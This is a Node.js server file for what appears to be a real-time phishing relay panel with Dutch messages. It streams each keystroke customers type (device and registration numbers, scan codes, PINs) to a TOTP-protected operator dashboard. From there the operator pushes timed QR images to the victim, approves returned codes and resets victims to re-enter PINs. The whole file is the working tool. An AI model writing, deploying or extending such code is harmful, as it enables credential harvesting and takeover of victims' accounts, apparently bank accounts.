const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const session = require('express-session');
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');
const fs = require('fs');
const cors = require('cors');
require('dotenv').config();

const app = express();
const server = http.createServer(app);

// CORS configuration for split deployment
const allowedOrigins = [
    'http://localhost:3000', // Client dev
    'http://localhost:3001', // Admin same-origin
    'http://localhost:3002', // Admin dev (if separate)
    process.env.CLIENT_URL,  // Production client
    process.env.ADMIN_URL    // Production admin
].filter(Boolean);

const io = socketIo(server, {
    cors: {
        origin: allowedOrigins,
        methods: ['GET', 'POST'],
        credentials: true
    }
});

// CORS middleware
app.use(cors({
    origin: function(origin, callback) {
        // Allow requests with no origin (mobile apps, Postman, etc)
        if (!origin) return callback(null, true);
        if (allowedOrigins.indexOf(origin) !== -1 || allowedOrigins.includes('*')) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

// Session configuration
const sessionMiddleware = session({
    secret: process.env.SESSION_SECRET || 'your-secret-key-change-this',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false, // Keep false for localhost, set to true in production with HTTPS
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000, // 24 hours
        sameSite: 'lax' // 'lax' for same-origin, 'none' only works with secure:true
    }
});

app.use(sessionMiddleware);
app.use(express.json());

// TOTP Secret storage file
const TOTP_FILE = path.join(__dirname, '.totp-secret.json');

// Initialize or load TOTP secret
function getTOTPSecret() {
    if (fs.existsSync(TOTP_FILE)) {
        const data = fs.readFileSync(TOTP_FILE, 'utf8');
        return JSON.parse(data);
    }
    return null;
}

function saveTOTPSecret(secret) {
    fs.writeFileSync(TOTP_FILE, JSON.stringify(secret, null, 2));
}

// Auth middleware
function isAuthenticated(req, res, next) {
    if (req.session && req.session.authenticated) {
        return next();
    }
    res.redirect('/admin-login.html');
}

// Generate TOTP secret (first time setup) - PROTECTED
app.post('/auth/generate-totp', (req, res) => {
    const { setupPassword } = req.body;
    
    // Check if already setup
    const existingSecret = getTOTPSecret();
    if (existingSecret) {
        return res.status(403).json({ 
            error: 'TOTP is al ingesteld. Verwijder .totp-secret.json op server om opnieuw in te stellen.' 
        });
    }
    
    // Check setup password from env
    const SETUP_PASSWORD = process.env.SETUP_PASSWORD || 'change-this-password';
    if (setupPassword !== SETUP_PASSWORD) {
        return res.status(401).json({ 
            error: 'Incorrect setup wachtwoord' 
        });
    }
    
    const secret = speakeasy.generateSecret({
        name: 'QR Verification System',
        issuer: 'QR Admin'
    });
    
    saveTOTPSecret({
        ascii: secret.ascii,
        hex: secret.hex,
        base32: secret.base32,
        otpauth_url: secret.otpauth_url
    });
    
    QRCode.toDataURL(secret.otpauth_url, (err, dataUrl) => {
        if (err) {
            return res.status(500).json({ error: 'Failed to generate QR code' });
        }
        
        res.json({
            secret: secret.base32,
            qrCode: dataUrl,
            setupComplete: true
        });
    });
});

// Verify TOTP code and login
app.post('/auth/totp-login', (req, res) => {
    const { code } = req.body;
    
    const totpSecret = getTOTPSecret();
    if (!totpSecret) {
        return res.json({ 
            success: false, 
            message: 'Setup vereist. Ga naar /admin-setup.html' 
        });
    }
    
    const verified = speakeasy.totp.verify({
        secret: totpSecret.base32,
        encoding: 'base32',
        token: code,
        window: 2 // Allow 2 steps before/after for clock skew
    });
    
    if (verified) {
        req.session.authenticated = true;
        req.session.loginTime = new Date();
        
        // Explicitly save session before responding
        req.session.save((err) => {
            if (err) {
                console.error('Session save error:', err);
                return res.json({ 
                    success: false, 
                    message: 'Session error. Probeer opnieuw.' 
                });
            }
            res.json({ success: true });
        });
    } else {
        res.json({ 
            success: false, 
            message: 'Ongeldige code. Probeer opnieuw.' 
        });
    }
});

// Check if TOTP is setup
app.get('/auth/totp-status', (req, res) => {
    const totpSecret = getTOTPSecret();
    res.json({
        setup: !!totpSecret,
        authenticated: req.session && req.session.authenticated
    });
});

// Logout
app.get('/auth/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) console.error('Logout error:', err);
        res.redirect('/admin-login.html');
    });
});

app.get('/auth/check', (req, res) => {
    res.json({
        authenticated: req.session && req.session.authenticated,
        loginTime: req.session?.loginTime || null
    });
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Protect admin page
app.get('/admin.html', isAuthenticated, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Store active clients and their data
const clients = new Map();

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Client joins as customer
    socket.on('join-customer', (data) => {
        const clientData = {
            id: socket.id,
            type: 'customer',
            ip: socket.handshake.address,
            device: data.device || 'Unknown',
            joinedAt: new Date(),
            step: 'initial',
            data: {
                deviceNumber: '',
                prefix: '',
                registrationNumber: '',
                qrCode: null,
                qrUploadedAt: null,
                scanCode: '',
                pin1: '',
                pin2: ''
            },
            status: 'waiting'
        };
        
        clients.set(socket.id, clientData);
        
        // Notify all admins about new customer
        io.emit('customer-joined', {
            id: socket.id,
            ip: clientData.ip,
            device: clientData.device,
            joinedAt: clientData.joinedAt
        });
        
        console.log('Customer joined:', socket.id);
    });

    // Join as admin
    socket.on('join-admin', () => {
        socket.join('admins');
        
        // Send current customers list
        const customersList = Array.from(clients.values())
            .filter(c => c.type === 'customer')
            .map(c => ({
                id: c.id,
                ip: c.ip,
                device: c.device,
                joinedAt: c.joinedAt,
                step: c.step,
                data: c.data,
                status: c.status
            }));
        
        socket.emit('customers-list', customersList);
        console.log('Admin joined');
    });

    // Customer typing in step 1
    socket.on('customer-typing-step1', (data) => {
        const client = clients.get(socket.id);
        if (client) {
            const isFirstChar = !client.data.deviceNumber && !client.data.prefix && !client.data.registrationNumber;
            
            client.data.deviceNumber = data.deviceNumber || '';
            client.data.prefix = data.prefix || '';
            client.data.registrationNumber = data.registrationNumber || '';
            
            // Notify admins with flash indicator for first character
            io.to('admins').emit('customer-typing', {
                id: socket.id,
                step: 'step1',
                data: client.data,
                flash: isFirstChar
            });
        }
    });

    // Customer submits step 1
    socket.on('customer-submit-step1', (data) => {
        const client = clients.get(socket.id);
        if (client) {
            client.step = 'waiting-qr';
            client.data.deviceNumber = data.deviceNumber;
            client.data.prefix = data.prefix;
            client.data.registrationNumber = data.registrationNumber;
            client.status = 'waiting-qr';
            
            io.to('admins').emit('customer-submitted-step1', {
                id: socket.id,
                data: client.data
            });
        }
    });

    // Admin uploads QR
    socket.on('admin-upload-qr', (data) => {
        const client = clients.get(data.customerId);
        if (client) {
            client.data.qrCode = data.qrImage;
            client.data.qrUploadedAt = Date.now();
            client.step = 'qr-scan';
            client.status = 'scanning';
            
            // Send QR to customer with timer
            io.to(data.customerId).emit('receive-qr', {
                qrImage: data.qrImage,
                expiresAt: Date.now() + (50 * 1000) // 50 seconds
            });
            
            // Update all admins
            io.to('admins').emit('qr-uploaded', {
                id: data.customerId,
                expiresAt: Date.now() + (50 * 1000) // 50 seconds
            });
        }
    });

    // Customer typing scan code
    socket.on('customer-typing-scancode', (data) => {
        const client = clients.get(socket.id);
        if (client) {
            client.data.scanCode = data.code || '';
            
            io.to('admins').emit('customer-typing', {
                id: socket.id,
                step: 'scancode',
                data: client.data
            });
        }
    });

    // Customer submits scan code
    socket.on('customer-submit-scancode', (data) => {
        const client = clients.get(socket.id);
        if (client) {
            client.data.scanCode = data.code;
            client.status = 'waiting-approval';
            
            io.to('admins').emit('customer-submitted-scancode', {
                id: socket.id,
                code: data.code
            });
        }
    });

    // Admin approves/rejects scan code
    socket.on('admin-scancode-decision', (data) => {
        const client = clients.get(data.customerId);
        if (client) {
            if (data.approved) {
                // Approved - move to pin entry
                client.step = 'pin-entry';
                client.status = 'entering-pins';
                client.data.scanCode = ''; // Clear for security
                
                io.to(data.customerId).emit('scancode-approved');
                
                io.to('admins').emit('customer-approved', {
                    id: data.customerId
                });
            } else {
                // Rejected - reset to waiting for new QR
                client.step = 'waiting-qr';
                client.status = 'waiting-qr';
                client.data.qrCode = null;
                client.data.qrUploadedAt = null;
                client.data.scanCode = '';
                
                io.to(data.customerId).emit('scancode-rejected');
                
                io.to('admins').emit('customer-rejected', {
                    id: data.customerId
                });
            }
        }
    });

    // Customer typing PINs
    socket.on('customer-typing-pins', (data) => {
        const client = clients.get(socket.id);
        if (client) {
            client.data.pin1 = data.pin1 || '';
            client.data.pin2 = data.pin2 || '';
            
            io.to('admins').emit('customer-typing', {
                id: socket.id,
                step: 'pins',
                data: client.data
            });
        }
    });

    // Customer submits PINs
    socket.on('customer-submit-pins', (data) => {
        const client = clients.get(socket.id);
        if (client) {
            client.data.pin1 = data.pin1;
            client.data.pin2 = data.pin2;
            client.step = 'completed';
            client.status = 'completed';
            
            io.to('admins').emit('customer-completed', {
                id: socket.id,
                pin1: data.pin1,
                pin2: data.pin2,
                match: data.pin1 === data.pin2
            });
            
            // Send completion to customer
            io.to(socket.id).emit('verification-complete');
        }
    });

    // Admin resets customer (opnieuw beginnen) with specific step
    socket.on('admin-reset-customer', (data) => {
        const client = clients.get(data.customerId);
        if (client) {
            const step = data.step || 'login'; // 'login' or 'pin'
            
            if (step === 'pin') {
                // Reset to PIN entry step
                client.step = 'pin-entry';
                client.status = 'entering-pins';
                client.data.pin1 = '';
                client.data.pin2 = '';
                
                // Tell customer to show PIN form
                io.to(data.customerId).emit('admin-reset-to-pin');
            } else {
                // Reset to login step (complete reset)
                client.step = 'initial';
                client.status = 'waiting';
                client.data.qrCode = null;
                client.data.qrUploadedAt = null;
                client.data.scanCode = '';
                client.data.pin1 = '';
                client.data.pin2 = '';
                
                // Tell customer to reload
                io.to(data.customerId).emit('admin-reset-to-login');
            }
            
            // Update admin
            io.to('admins').emit('customer-reset', {
                id: data.customerId,
                step: step
            });
        }
    });

    // Disconnect
    socket.on('disconnect', () => {
        const client = clients.get(socket.id);
        if (client && client.type === 'customer') {
            clients.delete(socket.id);
            io.to('admins').emit('customer-disconnected', { id: socket.id });
            console.log('Customer disconnected:', socket.id);
        }
    });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
    console.log(`🔥 Server running on port ${PORT}`);
    console.log(`📱 Klant: http://localhost:${PORT}`);
    console.log(`⚙️  Admin: http://localhost:${PORT}/admin.html`);
});
